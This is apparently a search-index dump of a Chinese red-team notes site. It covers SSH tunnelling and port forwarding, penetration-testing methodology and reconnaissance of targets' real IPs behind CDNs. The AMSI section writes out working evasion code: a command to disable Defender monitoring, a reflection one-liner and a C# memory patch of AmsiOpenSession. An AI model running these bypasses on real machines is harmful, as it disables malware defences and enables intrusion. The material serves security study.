\u8981\u5141\u8bb8\u672c\u5730\u7684\u8fdc\u7a0b\u8f6c\u53d1\u7aef\u53e3\u7ed1\u5b9a\u5728\u975e\u73af\u56de\u5730\u5740\u4e0a\uff0c\u9700\u8981\u5728\u5916\u7f51\u4e3b\u673a\u7684sshd\u914d\u7f6e\u6587\u4ef6\u4e2d\u542f\u7528\u201dGatewayPorts\u201d\u9879\uff0c\u5b83\u7684\u9ed8\u8ba4\u503c\u4e3ano\uff0c\u8fd9\u91cc\u5c06\u5b83\u6539\u4e3ayes\u3002\u7136\u540e\u91cd\u65b0\u8fdc\u7a0b\u8f6c\u53d1\u4e00\u4e0b\u5373\u53ef\u7528\u5916\u7f51\u5730\u5740\u8bbf\u95ee\u3002","title":"SSH\u8fdc\u7a0b\u8f6c\u53d1"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#ssh_2","text":"\u672c\u5730\u6216\u8fdc\u7a0b\u8f6c\u53d1\u7aef\u53e3\u548c\u76ee\u6807\u7aef\u53e3\u6240\u4ee3\u8868\u7684\u5e94\u7528\u5c42\u534f\u8bae\u662f\u4e00\u5bf9\u4e00\u7684\u5173\u7cfb\uff0c\u4e0d\u540c\u7684\u670d\u52a1\u5c31\u8981\u5efa\u7acb\u4e0d\u540c\u7684\u7aef\u53e3\uff0c\u5de5\u4f5c\u5f88\u662f\u7e41\u7410\uff0c\u800c\u52a8\u6001\u8f6c\u53d1\u53ea\u9700\u7ed1\u5b9a\u4e00\u4e2a\u672c\u5730\u7aef\u53e3\uff0c\u800c\u76ee\u6807\u7aef\u53e3\u662f\u6839\u636e\u4f60\u53d1\u8d77\u7684\u8bf7\u6c42\u51b3\u5b9a\u7684\uff0c\u6bd4\u5982\u8bf7\u6c42\u4e3a445\u7aef\u53e3\uff0c\u901a\u8fc7ssh\u8f6c\u53d1\u7684\u8bf7\u6c42\u4e5f\u662f445\u7aef\u53e3\u3002 \u8bed\u6cd5\u683c\u5f0f\uff1a ssh -D [bind_addr:]port remote \u8fd9\u91cc\u4e3e\u4e00\u4e2a\u6700\u7b80\u5355\u7684\u5217\u5b50\uff1a\u7ffb\u5899\u3002\u56fd\u5185\u6b63\u5e38\u60c5\u51b5\u4e0b\u4e0a\u4e0d\u4e86Google\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5c06\u6d41\u91cf\u8f6c\u53d1\u5230\u56fd\u5916\u7684vps\u4e0a\u8fd9\u6837\u5c31\u53ef\u4ee5\u6b63\u5e38\u8bbf\u95ee\u4e86\u3002 \u5728\u672c\u5730\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\uff0c\u5e76\u67e5\u770b\u5efa\u7acb\u8fde\u63a5\u60c5\u51b5 ssh -Nfg -D 3333 root@45.77.xx.xx \u8fde\u63a5\u5efa\u7acb\u6210\u529f\uff0c\u8bbe\u7f6e\u6d4f\u89c8\u5668\u5230\u672c\u5730\u4e3b\u673a\u76843333\u7aef\u53e3","title":"SSH\u52a8\u6001\u8f6c\u53d1,\u6b63\u5411\u4ee3\u7406\u505a\u52a8\u6001\u7684\u7aef\u53e3\u8f6c\u53d1"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#ssh_3","text":"\u5229\u7528ssh -L \u63d0\u4f9b\u6b63\u5411\u4ee3\u7406\uff0c\u5c06192.168.183.2\u768480\u7aef\u53e3\u6620\u5c04\u523045.77.xx.xx\u76841111\u7aef\u53e3\u4e0a \u8bbf\u95ee45.77.xx.xx:1111\u76f8\u5f53\u4e8e\u8bbf\u95ee192.168.183.2:80 \u4e2d\u95f4\u9700\u8981192.168.183.1\u7684ssh\u8fdb\u884c\u6b63\u5411\u4ee3\u7406\u8fdb\u884c\u5229\u7528\u3002 \u8bed\u6cd5\u683c\u5f0f\uff1a ssh -L 45.77.xx.xx:1111:192.168.183.2:80 root@192.168.183.1 \u6b64\u65f6\u6211\u4eec\u8bbf\u95ee45.77.xx.xx\u76841111\u7aef\u53e3\u5c31\u76f8\u5f53\u4e8e\u8bbf\u95ee\u5185\u7f51\u4e0d\u51fa\u7f51\u673a\u5668\u7684192.168.183.2:80","title":"SSH\u52a8\u6001\u8f6c\u53d1\uff0c\u6b63\u5411\u4ee3\u7406\u8fdb\u884c\u5355\u4e00\u7684\u7aef\u53e3\u8f6c\u53d1"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#16bypass-amsi","text":"How to Bypass AMSI \u7ba1\u7406\u5458\u6743\u9650\u5173\u95edamsi Set-MpPreference -DisableRealtimeMonitoring $true","title":"16.Bypass AMSI"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#amsi","text":"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPubilc,Static').SetValue($null,$true) \u88ab\u52a0\u9ed1\u4e86\uff0c\u53ef\u4ee5\u6df7\u6dc6\u8fc7","title":"\u4e00\u952e\u5173\u95edAMSI"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#powershell","text":"powershell.exe -version 2 //\u6539\u53d8powershell\u8fd0\u884c\u7248\u672c","title":"powershell\u964d\u7ea7"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#_44","text":"$p=@\" using System; using System.Linq; using System.Runtime.InteropServices; public class Program { [DllImport(\"kernel32\")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); [DllImport(\"kernel32\")] public static extern IntPtr LoadLibrary(string name); [DllImport(\"kernel32\")] public static extern IntPtr VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpfloldProtect); public static void Bypass() { String a = \"isma\"; IntPtr lib = LoadLibrary(String.Join(\"\" , a.Reverse().ToArray()) + \" .dll\"); IntPtr addr = GetProcAddress(lib, \"AmsiOpenSession\"); uint old = 0; byte[] p; p = new byte[6]; p[0] = 0xB8; p[1] = 0xFF; p[2] = 0xFF; p[3] = 0xFF; p[4] = 0xFF; p[5] = 0xC3; VirtualProtect(addr, (UIntPtr)p.Length, 0x04, out old); Marshal.Copy(p, 0, addr, p.Length); VirtualProtect(addr, (UIntPtr)p.Length, old, out old); } } \"@ Add-Type $p [Program]::Bypass() \u53c2\u8003\u94fe\u63a5\uff1a https://github.com/NyDubh3/Pentesting-Active-Directory-CN https://github.com/shmilylty/Intranet_Penetration_Tips Peace. \u63d0\u4ea4 4 \u8bc4\u8bba Anonymous Chrome 97.0.4692.71 Windows 10.0 2 \u5929\u524d\u56de\u590d \u771f\u4e0d\u9519 Anonymous Chrome 97.0.4692.99 macOS 10.15.7 2022-02-10\u56de\u590d \u6309\u65f6\u5f52\u8fd8 Anonymous Chrome 96.0.4664.93 Windows 10.0 2022-01-27\u56de\u590d \u6309\u65f6\u5f52\u8fd8 Anonymous Chrome 97.0.4692.99 macOS 10.15.7 2022-01-27\u56de\u590d \u771f\u4e0d\u9519 Powered By Valine v1.4.16 Copyright \u00a9 2021-2022 0r@nge \u672c\u7ad9\u603b\u8bbf\u95ee\u91cf19025\u6b21","title":"\u5185\u5b58\u8865\u4e01"},{"location":"redteam/%E6%8F%90%E6%9D%83%E7%B3%BB%E5%88%97/","text":"","title":"\u63d0\u6743\u7cfb\u5217"},{"location":"redteam/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%BD%92%E7%BA%B3/","text":"\u5199\u5728\u5f00\u5934\uff1a \u77e5\u8bc6\u9762\uff0c\u51b3\u5b9a\u770b\u5230\u7684\u653b\u51fb\u9762\u6709\u591a\u5e7f\u3002 \u77e5\u8bc6\u94fe\uff0c\u51b3\u5b9a\u53d1\u52a8\u7684\u6740\u4f24\u94fe\u6709\u591a\u6df1\u3002 #\u8bb0\u5f55\u4e00\u4e0b \u6e17\u900f\u6d4b\u8bd5 \u4e2d\u7684\u4e00\u4e9b\u77e5\u8bc6\u70b9 \u00b6 #\u6e17\u900f\u6d4b\u8bd5\u53ef\u4ee5\u8bf4\u662f\u6a21\u62df\u9ed1\u5ba2\u5165\u4fb5\u7684\u884c\u4e3a\uff0c\u4e0e\u4e4b\u4e0d\u540c\u7684\u662f\uff0c\u6211\u4eec\u76ee\u7684\u662f\u63d0\u9ad8\u7cfb\u7edf\u7684\u5b89\u5168\u6027\uff0c\u4fdd\u62a4\u7cfb\u7edf\u800c\u8fdb\u884c\u7684\u6d4b\u8bd5\u3002 \u5e38\u89c4\u6e17\u900f\u6d4b\u8bd5\u57fa\u672c\u6b65\u9aa4\uff0c\u4e3b\u8981\u5206\u4e3a8\u4e2a\u6b65\u9aa4\uff1a\u660e\u786e\u76ee\u6807\u3001\u4fe1\u606f\u6536\u96c6\u3001\u6f0f\u6d1e\u63a2\u6d4b\u3001\u6f0f\u6d1e\u9a8c\u8bc1\u3001\u4fe1\u606f\u5206\u6790\u3001\u83b7\u53d6\u6240\u9700\u3001\u6587\u6863\u6574\u7406\u3001\u751f\u6210\u62a5\u544a\u3002\u6d41\u7a0b\u5982\u4e0b\u56fe\u6240\u793a \u6e17\u900f\u6d4b\u8bd5\u57fa\u672c\u6d41\u7a0b \u660e\u786e\u76ee\u6807 \u786e\u5b9a\u76ee\u6807\u8303\u56f4\u3001\u9650\u5ea6\u3001\u9700\u6c42\u7b49\uff0c\u7136\u540e\u5236\u5b9a\u6e17\u900f\u6d4b\u8bd5\u65b9\u6848\uff1a \u786e\u5b9a\u8303\u56f4\uff1a\u6d4b\u8bd5\u76ee\u6807ip\u3001\u57df\u540d\u3001\u5185\u5916\u7f51\u3001\u6d4b\u8bd5\u8d26\u6237\u3001\u5b50\u7f51\u3001\u65c1\u7ad9\u7b49\u3002 \u786e\u5b9a\u89c4\u5219\uff1a\u80fd\u6e17\u900f\u5230\u4ec0\u4e48\u7a0b\u5ea6\uff0c\u5141\u8bb8\u6d4b\u8bd5\u7684\u65f6\u95f4\u6bb5\u548c\u5468\u671f\u3001\u80fd\u5426\u4fee\u6539\u4e0a\u4f20\u3001\u63d0\u6743\u3001\u67e5\u770b\u6570\u636e\u7b49\u654f\u611f\u64cd\u4f5c\u3002 \u786e\u5b9a\u9700\u6c42\uff1aweb\u5e94\u7528\u670d\u52a1\u6f0f\u6d1e\u3001\u4e1a\u52a1\u903b\u8f91\u6f0f\u6d1e\u3001\u4eba\u5458\u6743\u9650\u7ba1\u7406\u6f0f\u6d1e\u7b49\u3002 \u4fe1\u606f\u6536\u96c6\u3001 \u5229\u7528\u5404\u79cd\u65b9\u6cd5\u83b7\u53d6\u66f4\u591a\u5173\u4e8e\u76ee\u6807\u7684\u4fe1\u606f\uff0c\u5229\u7528\u65b9\u5f0f\u5982\u626b\u63cf\uff0c\u5f00\u653e\u641c\u7d22\u83b7\u53d6\u540e\u53f0\u9875\u9762\uff0c\u672a\u6388\u6743\u9875\u9762\uff0c\u654f\u611fURL\u7b49\uff1a \u57fa\u7840\u4fe1\u606f\uff1aIP\u3001\u7f51\u6bb5\u3001\u57df\u540d\u3001\u7aef\u53e3\u3002 \u5e94\u7528\u4fe1\u606f\uff1a\u5404\u7aef\u53e3\u7684\u5e94\u7528\u3002\u4f8b\u5982web\u5e94\u7528\u3001\u90ae\u4ef6\u5e94\u7528\u3001\u7b49\u7b49\u3002 \u7cfb\u7edf\u4fe1\u606f\uff1a\u64cd\u4f5c\u7cfb\u7edf\u548c\u5bf9\u5e94\u7248\u672c\u3002 \u7248\u672c\u4fe1\u606f\uff1a\u6240\u6709\u63a2\u6d4b\u5230\u7684\u7248\u672c\uff0c\u5982\u4e2d\u95f4\u4ef6\uff0c\u7cfb\u7edf\u7b49\u3002 \u670d\u52a1\u4fe1\u606f\uff1a\u5404\u79cd\u670d\u52a1\u5f00\u653e\u60c5\u51b5\uff0c\u662f\u5426\u6709\u9ad8\u5371\u670d\u52a1\u7b49\u3002 \u4eba\u5458\u4fe1\u606f\uff1a\u57df\u540d\u6ce8\u518c\u4eba\u5458\u4fe1\u606f\uff0cweb\u5e94\u7528\u7528\u6237\u4fe1\u606f\uff0c\u7ba1\u7406\u5458\u4fe1\u606f\u7b49\u3002 \u9632\u62a4\u4fe1\u606f\uff1a\u9632\u62a4\u8bbe\u5907\uff0c\u5982\u9632\u706b\u5899\uff0c\u5b89\u5168\u72d7\u7b49\u3002 \u6f0f\u6d1e\u63a2\u6d4b \u7ed3\u5408\u4fe1\u606f\u6536\u96c6\u7684\u4fe1\u606f\uff0c\u5206\u6790\u627e\u5230\u6f0f\u6d1e\u70b9\u3002 \u5229\u7528\u6f0f\u626b\u5de5\u5177\uff0c\u5982awvs\u3001appscan\u3001xray\u3001goby\u7b49\u3002 \u770b\u5386\u53f2\u6f0f\u6d1e\u53ca\u8865\u4e01\u662f\u5426\u4fee\u590d\u3002 \u662f\u5426\u4f7f\u7528\u542b\u6709\u6f0f\u6d1e\u7684\u7248\u672c\u3002 \u5b89\u5168\u914d\u7f6e\u89c4\u8303\uff0cWeb\u5e94\u7528\u6f0f\u6d1e\u7b49\u3002 \u6f0f\u6d1e\u9a8c\u8bc1 \u5c06\u4e0a\u4e00\u6b65\u4e2d\u53d1\u73b0\u7684\u5168\u90e8\u6f0f\u6d1e\u90fd\u9a8c\u8bc1\u4e00\u904d\u3002\u7ed3\u5408\u5b9e\u9645\u60c5\u51b5\uff0c\u642d\u5efa\u6a21\u62df\u73af\u5883\u8fdb\u884c\u8bd5\u9a8c\u3002\u6210\u529f\u540e\u518d\u5e94\u7528\u4e8e\u76ee\u6807\u3002 \u4fe1\u606f\u5206\u6790 \u5206\u6790\u524d\u9762\u7684\u4fe1\u606f\u4e3a\u4e0b\u4e00\u6b65\u5b9e\u65bd\u6e17\u900f\u505a\u51c6\u5907\u3002\u51c6\u5907\u597d\u4e0a\u4e00\u6b65\u63a2\u6d4b\u5230\u7684\u6f0f\u6d1e\u5229\u7528\u65b9\u6cd5\uff0c\u7cbe\u51c6\u6253\u51fb\u76ee\u6807\u3002 \u7ed5\u8fc7\u9632\u5fa1\u673a\u5236\u3002 \u5b9a\u5236\u6e17\u900f\u8def\u5f84\uff0c\u5bfb\u627e\u7a81\u7834\u53e3\u3002 \u7ed5\u8fc7\u68c0\u6d4b\u673a\u5236\u3001\u6d41\u91cf\u76d1\u63a7\uff0c\u6740\u6bd2\u8f6f\u4ef6\uff0c\u6076\u610f\u4ee3\u7801\u68c0\u6d4b\u7b49\uff08\u514d\u6740\uff09\u3002 \u83b7\u53d6\u6240\u9700 \u83b7\u53d6\u5185\u90e8\u4fe1\u606f\uff1a\u57fa\u7840\u8bbe\u65bd\u4fe1\u606f\uff08\u7f51\u7edc\u67b6\u6784\uff0cVPN\uff0c\u8def\u7531\uff0c\u62d3\u6251\u7b49\uff09\u3002 \u5185\u7f51\uff1a\u5185\u7f51\u5165\u4fb5\uff0c\u6743\u9650\u7ef4\u6301\uff08\u4e00\u822c\u5ba2\u6237\u4e0d\u9700\u8981\u6b64\u6b65\u9aa4\uff09\u3002 \u6e05\u7406\u75d5\u8ff9\uff1a\u6e05\u7406\u76f8\u5173\u65e5\u5fd7\u3001\u64cd\u4f5c\u8bb0\u5f55\u3001\u6587\u4ef6\u7b49\u3002 \u4fe1\u606f\u6574\u7406 \u6e17\u900f\u5de5\u5177\uff1a\u6574\u7406\u6e17\u900f\u8fc7\u7a0b\u4e2d\u7528\u5230\u7684\u4ee3\u7801\uff0cpoc\uff0cexp\u7b49\u3002 \u6536\u96c6\u4fe1\u606f\uff1a\u6574\u7406\u6e17\u900f\u8fc7\u7a0b\u4e2d\u6536\u96c6\u5230\u7684\u4e00\u5207\u4fe1\u606f\u3002 \u6f0f\u6d1e\u4fe1\u606f\uff1a\u6574\u7406\u6e17\u900f\u8fc7\u7a0b\u4e2d\u9047\u5230\u7684\u5404\u79cd\u6f0f\u6d1e\uff0c\u8106\u5f31\u4f4d\u7f6e\u4fe1\u606f\u7b49\u3002 \u5f62\u6210\u62a5\u544a \u6309\u7167\u4e0e\u5ba2\u6237\u786e\u5b9a\u7684\u8303\u56f4\u3001\u9700\u6c42\u6574\u7406\u6e17\u900f\u6d4b\u8bd5\u7ed3\u679c\u5f62\u6210\u62a5\u544a\u3002\u63d0\u4f9b\u6f0f\u6d1e\u4fee\u590d\u5efa\u8bae\u548c\u89e3\u51b3\u65b9\u6cd5\u3002 \u6bcf\u4e2a\u6b65\u9aa4\u5177\u4f53\u5185\u5bb9\u5728\u7f51\u4e0a\u4e5f\u6709\u8bb8\u591a\u89c4\u8303\u548c\u5927\u4f6c\u59ff\u52bf\uff0c\u5177\u4f53\u60c5\u51b5\u4e5f\u662f\u6839\u636e\u5b9e\u9645\u9879\u76ee\u6765\u3002\u4e00\u822c\u6f0f\u6d1e\u626b\u63cf\u5230\u7b2c4\u6b65\u5c31\u7ed3\u675f\u5e76\u8f93\u51fa\u62a5\u544a\u4e86\uff0c\u800c\u6e17\u900f\u6d4b\u8bd5\u5219\u662f\u8fd8\u9700\u8981\u66f4\u8fd1\u4e00\u6b65\u6e17\u900f\uff0c\u5229\u7528\u6f0f\u6d1e\u83b7\u53d6\u76ee\u6807\u6743\u9650\uff0c\u6240\u9700\u4fe1\u606f\u7b49\uff0c\u5305\u62ec\u7ed5\u8fc7\u4e00\u4e9b\u9632\u5fa1\u673a\u5236\uff0c\u514d\u6740\u7b49\u3002\u751a\u81f3\u6709\u65f6\u8fd8\u9700\u8981\u82b1\u8d39\u51e0\u4e2a\u661f\u671f\u81f3\u51e0\u4e2a\u6708\uff0c\u8fd9\u4e5f\u662f\u6e17\u900f\u6d4b\u8bd5\u82b1\u8d39\u4eba\u529b\u66f4\u591a\uff0c\u8d39\u7528\u66f4\u9ad8\u539f\u56e0\u3002 Tips \u62ff\u5230ip\u660e\u786e\u76ee\u6807\u540e\uff0c\u4e00\u822c\u80fd\u8fdb\u884c\u626b\u63cf\u8f6f\u4ef6\u626b\u63cf\uff0c\u53ef\u4ee5\u5148\u626b\u63cf\u4e00\u6ce2 \u5728\u626b\u63cf\u7684\u540c\u65f6\u6211\u4f1a\u6d4f\u89c8\u4e00\u4e0b\u7f51\u7ad9\u7684\u754c\u9762\u529f\u80fd\u53ca\u7ed3\u6784\uff0c\u5229\u7528Wappalyzer\u7b49\u5de5\u5177\u67e5\u770b\u7248\u672c\u4fe1\u606f\u7b49 \u56e0\u4e3a\u6211\u5f85\u7684\u7c7b\u4f3c\u5728\u7532\u65b9\uff0c\u5e76\u4e14\u5728\u5185\u7f51\u4e0d\u7528\u641c\u7d22\u5f15\u64ce\u641c\u7d22\u4e00\u4e9b\u654f\u611f\u4fe1\u606f\uff0c\u8fd9\u91cc\u6211\u76f4\u63a5\u5229\u7528nmap \u8fdb\u884c\u63a2\u6d4b\uff0c\u67e5\u770b\u7aef\u53e3\u5f00\u653e\u670d\u52a1\u548c\u7248\u672c\uff0c\u7f51\u4e0a\u641c\u7d22\u7248\u672c\u662f\u5426\u6709\u5386\u53f2\u6f0f\u6d1e\uff0c\u5982redis\u672a\u6388\u6743\u6f0f\u6d1e\uff0c\u50cf22\u7aef\u53e3\u5f00\u653e\uff0c\u53ef\u4ee5\u8bd5\u8bd5\u5f31\u53e3\u4ee4\u7206\u7834\u3002nmap\u7684\u529f\u80fd\u6709\u5f88\u591a\uff0c\u91cc\u9762\u4e5f\u6709\u5f88\u591a\u811a\u672c\u53ef\u4ee5\u76f4\u63a5\u5229\u7528\u3002 \u626b\u63cf\u654f\u611f\u76ee\u5f55\uff0c\u76ee\u5f55\u626b\u63cf\u5de5\u5177\u4e5f\u5f88\u591a\uff0c\u4e0d\u540c\u5de5\u5177\u626b\u63cf\u51fa\u7ed3\u679c\u4e5f\u4e0d\u540c\uff0c\u6211\u7528\u7684dirmap\u548cdirb\u7ed3\u679c\u4e5f\u6709\u533a\u522b\uff0c\u4e0d\u80fd\u8bf4\u54ea\u6b3e\u5de5\u5177\u4e0d\u884c\uff0c\u90fd\u6709\u7279\u70b9\uff0c\u8fd9\u91cc\u6211\u4eec\u6574\u5408\u4e00\u4e0b\u7ed3\u679c\u5c31\u597d\u4e86\uff0c\u51e0\u6b3e\u5de5\u5177\u4e00\u8d77\u5f80\u5f80\u6709\u610f\u5916\u53d1\u73b0\u3002\u5728\u5de5\u5177\u5f3a\u5927\u4e4b\u5916\u8fd8\u9700\u8981\u770b\u5b57\u5178\u7684\uff0c\u8fd9\u4e2a\u9700\u8981\u81ea\u5df1\u7ecf\u9a8c\u4e0d\u65ad\u8865\u5145\uff0c\u5236\u4f5c\u9002\u5408\u81ea\u5df1\u7684\u5b57\u5178\u3002 \u4e2d\u95f4\u4ef6\u4fe1\u606f\uff0c\u770b\u770b\u662f\u5426\u662f\u8001\u7248\u672c\u4e86\uff0c\u542b\u6709\u5df2\u77e5\u6f0f\u6d1e\uff0c\u8865\u4e01\u662f\u5426\u4fee\u590d \u6ce8\u5165\uff0c\u6d4f\u89c8\u9875\u9762\u770b\u53c2\u6570id\uff0cuname\uff0cclassid\u7b49\u662f\u5426\u5b58\u5728\u6ce8\u5165\uff0c\u5b58\u5728\u53ef\u4ee5\u4e22sqlmap\u8dd1\uff0c\u6216\u8005\u770b\u5230\u6709\u8fd9\u79cd\u53c2\u6570\u7684\u76f4\u63a5\u4e22sqlmap XSS\uff0c\u89c1\u6846\u6846\u5c31\u63d2\uff0c\u6211\u6d4b\u8bd5\u65f6\uff0c\u7531\u4e8e\u662f\u5185\u90e8\u5f00\u53d1\u9879\u76ee\uff0c\u4e00\u822c\u5c31\u9488\u5bf9\u6027\u7684\u6d4b\u8bd5\u4e00\u4e0b CSRF\uff0c\u6709token\u65e0referer\u76f4\u63a5\u5220\u9664token\uff1b\u6709token\u548creferer\uff0c\u5220\u9664referer\u6216\u503c\uff0c\u6709\u9a8c\u8bc1\u53ef\u4ee5\u6784\u9020referer\u503c\uff0c\u5982\u679c\u54cd\u5e94\u4e0d\u62a5\u9519\u8bf4\u660e\u5b58\u5728\uff0c\u4e5f\u53ef\u4ee5\u5229\u7528burpsuite\u751f\u6210csrf poc\u6765\u6d4b\u8bd5 \u770b\u770b\u6709\u6ca1\u6709\u4e0a\u4f20\u5904\u6d4b\u8bd5\u4e00\u4e0b\uff0c\u4e00\u822c\u662f\u767d\u540d\u5355\u6211\u5c31\u4e0d\u6d4b\u8bd5\u4e86\uff0c\u5148\u4e0b\u4e00\u6b65 \u767b\u9646\u5904\uff0c\u7206\u7834\uff0c\u6709\u9a8c\u8bc1\u7801\u53ef\u4ee5\u6293\u5305\u89c2\u5bdf\u9a8c\u8bc1\u7801\u662f\u5426\u56fa\u5b9a\uff0c\u6709\u8ff9\u53ef\u5bfb \u627e\u56de\u5bc6\u7801\u5904\uff0cXSS\uff0c\u6ce8\u5165\uff0c\u903b\u8f91\u6f0f\u6d1e\u53ef\u80fd\u5b58\u5728\uff0c\u6293\u5305\u591a\u89c2\u5bdf \u6709\u8d26\u53f7\u767b\u9646\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u6d4b\u8bd5\u4e00\u4e0b\u4f1a\u8bdd\u56fa\u5b9a\u6f0f\u6d1e\uff0c\u767b\u9646\u524d\u540ecookie\u503c\u53d8\u5316\uff0c\u8d8a\u6743\u6f0f\u6d1e URL\u8df3\u8f6c\uff0c\u6709\u4e9b\u5730\u5740\u540e\u9762\u4f1a\u63d0\u4ea4\u5230\u5176\u4ed6\u9875\u9762\uff0c\u591a\u89c2\u5bdf\u5730\u5740 \u8fd8\u6709\u5c31\u662f\u6293\u5305\u5206\u6790\u770b\u770bjs\u6216\u8005\u6d4f\u89c8\u5668\u67e5\u770b\uff0c\u6709\u4e9bjs\u91cc\u9762\u53ef\u80fd\u6709\u610f\u5411\u4e0d\u5230\u7684\u53d1\u73b0 \u8fd9\u4e9b\u90fd\u662f\u6f0f\u6d1e\u53d1\u73b0\u7684\u90e8\u5206\u601d\u8def\uff0c\u540e\u7eed\u8fd8\u6709\u5229\u7528\u6f0f\u6d1e\u83b7\u53d6webshell\uff0c\u63d0\u6743\uff0c\u5185\u7f51\u6e17\u900f\uff0c\u4e00\u822c\u5ba2\u6237\u8981\u6c42\u7684\u6e17\u900f\u6d4b\u8bd5\u4e5f\u4e0d\u7528\u8fd9\u4e48\u6df1\u5165\uff0c\u70b9\u5230\u4e3a\u6b62\u3002 \u5411\u90a3\u4e9b\u8ffd\u51fb\u9ed1\u4ea7\u7684\u5927\u4f6c\u81f4\u656c\u3002 \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014 \u7248\u6743\u58f0\u660e\uff1a\u672c\u6587\u4e3aCSDN\u535a\u4e3b\u300cSecAaron\u300d\u7684\u539f\u521b\u6587\u7ae0\uff0c\u9075\u5faaCC 4.0 BY-SA\u7248\u6743\u534f\u8bae\uff0c\u8f6c\u8f7d\u8bf7\u9644\u4e0a\u539f\u6587\u51fa\u5904\u94fe\u63a5\u53ca\u672c\u58f0\u660e\u3002 \u539f\u6587\u94fe\u63a5\uff1a https://blog.csdn.net/shinyhuang_/article/details/121338584 0x01 \u4fe1\u606f\u6536\u96c6 \u00b6 \u5728\u4e00\u6b21Web\u6e17\u900f\u8fc7\u7a0b\u4e2d\uff0c\u4fe1\u606f\u6536\u96c6\u7684\u76ee\u7684\u662f\u7ad9\u5728\u65c1\u89c2\u8005\u7684\u89d2\u5ea6\uff0c\u53bb\u4e86\u89e3\u6574\u4e2aWeb\u5e94\u7528\u7684\u5168\u8c8c\u3002 1. \u76ee\u6807\u786e\u8ba4** \u00b6 1.1 \u57df\u540d\u6ce8\u518c\u4fe1\u606f** \u00b6 \u901a\u8fc7\u5982\u4e0b\u6b65\u9aa4\u786e\u8ba4\u76ee\u6807\u6240\u6709\u8005\u4fe1\u606f\uff1a Whois \u76ee\u6807\u57df\u540d/\u4e3b\u673a\u540d\uff1a whois example.com \u89e3\u6790\u76ee\u6807\u57df\u540d/\u4e3b\u673a\u540d\u7684IP\u5730\u5740\uff1a dig +short example.com \u83b7\u53d6\u57df\u540d\u7684\u8be6\u7ec6\u89e3\u6790\u8fc7\u7a0b dig +trace example.com \u83b7\u53d6\u771f\u5b9eIP\uff1a \u200b \u9a8c\u8bc1\u662f\u5426\u5b58\u5728CDN \u200b \u65b9\u6cd51\uff1a \u4f7f\u7528\u5404\u79cd\u591a\u5730 ping \u7684\u670d\u52a1\uff0c\u67e5\u770b\u5bf9\u5e94 IP \u5730\u5740\u662f\u5426\u552f\u4e00\uff0c\u5982\u679c\u4e0d\u552f\u4e00\u591a\u534a\u662f\u4f7f\u7528\u4e86CDN\uff0c \u591a\u5730 Ping \u7f51\u7ad9\u6709\uff1a \u200b http://ping.chinaz.com/ \u200b http://ping.aizhan.com/ \u200b http://ce.cloud.360.cn/ \u200b \u65b9\u6cd52\uff1a \u8bd5\u7528nslookup\u8fdb\u884c\u68c0\u6d4b\uff0c\u5982\u679c\u8fd4\u56de\u57df\u540d\u89e3\u6790\u5bf9\u5e94\u591a\u4e2aIP\uff0c\u90a3\u4e48\u591a\u534a\u662f\u8bd5\u7528\u4e86CDN. \u200b nslookup example.com \u200b \u65b9\u6cd53: \u200b \u5728\u7ebf\u5de5\u5177\u67e5\u770b\u662f\u5426\u5b58\u5728CDN\uff0c\u53ef\u4ee5\u53c2\u8003\u4ee5\u4e0b\u7ad9\u70b9: \u200b http://www.cdnplanet.com/tools/cdnfinder/ \u200b http://www.ipip.net/ip.html \u200b \u7ed5\u8fc7CDN\u67e5\u627e\u7f51\u7ad9\u771f\u5b9eIP \u200b 1.\u67e5\u8be2\u5386\u53f2DNS\u8bb0\u5f55(ip\u7684\u5386\u53f2\u89e3\u6790\u57df\u540d\uff0c\u57df\u540d\u7684\u5386\u53f2\u89e3\u6790ip) \u67e5\u770b IP \u4e0e \u57df\u540d\u7ed1\u5b9a\u7684\u5386\u53f2\u8bb0\u5f55\uff0c\u53ef\u80fd\u4f1a\u5b58\u5728\u4f7f\u7528 CDN \u524d\u7684\u8bb0\u5f55\uff0c\u76f8\u5173\u67e5\u8be2\u7f51\u7ad9\u6709\uff1a \u200b https://dnsdb.io/zh-cn/ \u200b https://x.threatbook.cn/ https://censys.io/ipv4?q=baidu.com \u975e\u5e38\u725b\u903c\u7684IP\u8bb0\u5f55\u7ad9\uff0c\u8fd8\u80fd\u5206\u6790\u5185\u94fe\u4e4b\u7c7b\u627e\u51fa\u53ef\u80fd\u7684IP\u5730\u5740\uff0c\u6b64\u5916\u8fd8\u4f1a\u8bb0\u5f55\u5386\u53f2\u3002 \u200b viewdns.info \u540c\u6837\u662f\u4e2a\u4ee4\u7ad9\u957f\u5341\u5206\u86cb\u75bc\u7684DNS\u5386\u53f2\u8bb0\u5f55\u7f51\u7ad9\uff0c\u8bb0\u5f55\u4e86\u51e0\u5e74\u5185\u7684\u66f4\u6539\u8bb0\u5f55\u3002 securitytrails.com https://site.ip138.com/ \u200b \u5e9e\u5927\u7684DNS\u5386\u53f2\u6570\u636e\u5e93\uff0c\u53ef\u4ee5\u67e5\u51fa\u51e0\u5e74\u5185\u7f51\u7ad9\u7528\u8fc7\u7684IP\u3001\u673a\u623f\u4fe1\u606f\u7b49\u3002 iphostinfo.com \u200b 